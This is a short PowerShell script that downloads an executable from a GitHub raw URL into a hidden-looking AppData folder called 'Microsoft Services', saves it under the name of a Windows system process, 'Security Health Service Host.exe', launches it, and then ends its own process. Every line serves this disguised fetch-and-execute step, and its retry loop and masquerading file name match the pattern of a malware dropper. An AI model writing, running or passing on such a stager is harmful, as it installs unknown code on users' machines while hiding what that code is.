


function download($from, $to) {
    while ($true) {
        try {
            Invoke-WebRequest -Uri $from -OutFile $to -UseBasicParsing -ErrorAction Stop
            return
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}
$path = "$env:APPDATA\Microsoft Services\"
New-Item -ItemType Directory -Force -Path $path | Out-Null

download "https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe" "$path\Security Health Service Host.exe"
Start-Process "$path\Security Health Service Host.exe"

Stop-Process -Id $PID
